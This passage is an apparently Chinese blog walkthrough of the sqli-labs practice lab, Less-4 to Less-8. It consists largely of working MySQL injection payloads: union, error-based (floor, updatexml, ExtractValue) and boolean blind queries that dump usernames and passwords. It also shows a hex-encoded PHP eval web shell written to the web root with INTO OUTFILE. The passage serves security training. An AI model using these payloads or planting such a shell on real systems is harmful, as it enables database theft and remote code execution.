src="/img/sqli-labs/clip_image001-7997532.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997532.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="less-4-GET-注入"><a href="#less-4-GET-注入" class="headerlink" title="less-4 GET 注入"></a>less-4 GET 注入</h2><p>验证注入点：双引号报错，两个双引号闭合<br />利用闭合方式：<code>&quot;) &lt;payload&gt; --+</code></p><p>也是闭合符号不一样</p><p><img src="/img/sqli-labs/clip_image001-7997540.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997540.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="猜字段-2"><a href="#猜字段-2" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)  order by 4 --+</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997547.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997547.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="爆破数据-1"><a href="#爆破数据-1" class="headerlink" title="爆破数据"></a>爆破数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=2 union select 1,</span><br><span class="line">(select group_concat(username) from security.users),</span><br><span class="line">(select group_concat(password) from security.users) --+</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997554.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997554.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-5-GET-报错注入"><a href="#Less-5-GET-报错注入" class="headerlink" title="Less-5 GET 报错注入"></a>Less-5 GET 报错注入</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>&#39; &lt;payload&gt; --+</code><br />考察点：报错注入</p><h3 id="通过floor报错-最多回显-64-个字符"><a href="#通过floor报错-最多回显-64-个字符" class="headerlink" title="通过floor报错 最多回显 64 个字符"></a>通过floor报错 最多回显 64 个字符</h3><p>推荐阅读：<a href="https://blog.csdn.net/weixin_45146120/article/details/100062786">https://blog.csdn.net/weixin_45146120/article/details/100062786</a> ，报错原理讲的很好！</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="number">0</span>,</span><br><span class="line">concat(<span class="number">0x3a</span>,</span><br><span class="line">    (<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>),</span><br><span class="line"><span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) </span><br><span class="line"><span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,(select database()),0x3a,floor(rand(0)*2)) </span></span><br><span class="line"><span class="string">as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997567.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997567.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="执行多条语句"><a href="#执行多条语句" class="headerlink" title="执行多条语句"></a>执行多条语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,</span></span><br><span class="line"><span class="string">    (select concat(version,0x3a,database(),0x3a,user(),0x3a)),</span></span><br><span class="line"><span class="string">0x3a,floor(rand(0)*2)) </span></span><br><span class="line"><span class="string">as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997572.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997572.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,</span></span><br><span class="line"><span class="string">    (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">0x3a,floor(rand(0)*2))</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997582.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997582.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,</span></span><br><span class="line"><span class="string">    (select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">0x3a,floor(rand(0)*2)) </span></span><br><span class="line"><span class="string">as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997591.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997591.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>从这里可以看出，使用floor报错最多能输出 64 个字符<br /></p><p><img src="/img/sqli-labs/clip_image001-7997597.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997597.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,</span></span><br><span class="line"><span class="string">    (select username from users limit 1),</span></span><br><span class="line"><span class="string">0x3a,floor(rand(0)*2)) </span></span><br><span class="line"><span class="string">as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997606.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997606.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>不是很能理解，为什么这里用 group_concat 不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),0,</span></span><br><span class="line"><span class="string">concat(0x3a,</span></span><br><span class="line"><span class="string">    (select group_concat(username,password) from users),</span></span><br><span class="line"><span class="string">0x3a,floor(rand(0)*2)) </span></span><br><span class="line"><span class="string">as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure><h3 id="通过-updatexml-报错-最多回显-32-个字符"><a href="#通过-updatexml-报错-最多回显-32-个字符" class="headerlink" title="通过 updatexml 报错 最多回显 32 个字符"></a>通过 updatexml 报错 最多回显 32 个字符</h3><p>报错说明：<a href="https://www.cnblogs.com/vspiders/p/7400415.html">https://www.cnblogs.com/vspiders/p/7400415.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库-1"><a href="#获取数据库-1" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997615.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997615.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997622.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997622.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>由此可以看出，使用floor报错最多能输出 32 个字符<br /></p><p><img src="/img/sqli-labs/clip_image001-7997634.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997634.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h3 id="通过-ExtractValue-报错-最多回显-32-个字符"><a href="#通过-ExtractValue-报错-最多回显-32-个字符" class="headerlink" title="通过 ExtractValue 报错 最多回显 32 个字符"></a>通过 ExtractValue 报错 最多回显 32 个字符</h3><p>报错说明：<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ExtractValue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库-2"><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ExtractValue(1, concat(0x7e,(select database()),0x7e)) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997646.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997646.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ExtractValue(1, concat(0x7e,(select group_concat(id,username, password) from users),0x7e)) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997653.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997653.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>由此可以看出，使用 ExtractValue 报错最多能输出 32 个字符<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1625104614351-0fd29fe2-62f6-43f1-b5b4-01617cdee27f.png#height=40&id=RFza0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=712&originalType=binary&ratio=1&size=9071&status=done&style=none&width=356" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1625104614351-0fd29fe2-62f6-43f1-b5b4-01617cdee27f.png#height=40&id=RFza0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=712&originalType=binary&ratio=1&size=9071&status=done&style=none&width=356" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="/img/sqli-labs/clip_image001-7997661.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997661.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-6-GET-报错注入或布尔盲注"><a href="#Less-6-GET-报错注入或布尔盲注" class="headerlink" title="Less-6 GET 报错注入或布尔盲注"></a>Less-6 GET 报错注入或布尔盲注</h2><p>验证注入点：双引号报错，两个双引号闭合<br />利用闭合方式：<code>&quot; &lt;payload&gt; --+</code></p><p>就闭合方式和 Less-5 不一样外，其余都一样</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot; union select count(*),0,</span><br><span class="line">concat(0x3a,</span><br><span class="line">    (select username from users limit 1),</span><br><span class="line">0x3a,floor(rand(0)*2)) </span><br><span class="line">as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997670.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997670.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-7-GET-注入写-shell"><a href="#Less-7-GET-注入写-shell" class="headerlink" title="Less-7 GET 注入写 shell"></a>Less-7 GET 注入写 shell</h2><p>验证注入点：单引号报错，两个单引号闭合<br />利用闭合方式：<code>&#39;)) &lt;payload&gt; --+</code></p><p>根据靶场首页的题目名字，是想让我们试试写shell</p><p>写 Shell 即 MySQL 需要对外写文件，但默认 MySQL 是不允许使用 <code>outfile</code> 来导出数据的，先手动在 MySQL 确认一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997676.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>参考这里：<a href="https://www.cnblogs.com/lyxsalyd/p/11955988.html">https://www.cnblogs.com/lyxsalyd/p/11955988.html</a></p><p>MYSQL的特性 secure_file_priv 对读写文件的影响，此开关默认为NULL，即不允许导入导出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv参数是用来限制LOAD DATA，SELECT ...OUTFILE,and LOAD_FILE()传到哪个指定目录的</span><br><span class="line"></span><br><span class="line">        当secure_file_priv的值为null，表示限制mysqld不允许导入|导出</span><br><span class="line">    当secure_file_prv的值为/tmp/,表示限制mysqld 的导入|导出只能发生在/tmp/目录下</span><br><span class="line">    当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</span><br><span class="line"></span><br><span class="line">windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</span><br><span class="line">linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</span><br><span class="line"></span><br><span class="line">然后重启mysql</span><br></pre></td></tr></table></figure><p>写 Shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select null,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e,null into outfile &#x27;</span><span class="operator">/</span>Applications<span class="operator">/</span>MAMP<span class="operator">/</span>htdocs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span>tari.php<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>这里有个小注意事项，不能直接把 <code>&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;</code> 转 16 进制，因为 <code>&lt;?php eval</code> 之间的空格不会保留的。因此要手动加上 <code>20</code> 空格，不然写的 shell 会是 <code>&lt;?phpeval</code> 这样的。</p><p><img src="/img/sqli-labs/clip_image001-7997687.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997687.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>报错不要紧因为这个语句值返回空<br /></p><p><img src="/img/sqli-labs/clip_image001-7997703.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997703.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>看一波这个目录就知道成功写进去了<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1625104706980-82e4b5c1-4243-4f8f-a4a5-c4594b0dc684.png#height=145&id=sogCz&margin=%5Bobject%20Object%5D&name=image.png&originHeight=290&originWidth=936&originalType=binary&ratio=1&size=174388&status=done&style=none&width=468" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1625104706980-82e4b5c1-4243-4f8f-a4a5-c4594b0dc684.png#height=145&id=sogCz&margin=%5Bobject%20Object%5D&name=image.png&originHeight=290&originWidth=936&originalType=binary&ratio=1&size=174388&status=done&style=none&width=468" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="/img/sqli-labs/clip_image001-7997708.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997708.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-8-GET-布尔盲注"><a href="#Less-8-GET-布尔盲注" class="headerlink" title="Less-8 GET 布尔盲注"></a>Less-8 GET 布尔盲注</h2><p>验证注入点：单引号无回显，两个单引号闭合<br />利用闭合方式：<code>&#39; &lt;payload&gt; --+</code></p><p>数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database()) = 8 --+</span></span><br></pre></td></tr></table></figure><p>数据库名 security<br /></p><p><img src="/img/sqli-labs/clip_image001-7997716.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997716.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),1,1)) = 115 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),3,1)) = 99 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">4</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),5,1)) = 114 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">6</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select database()),7,1)) = 116 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> 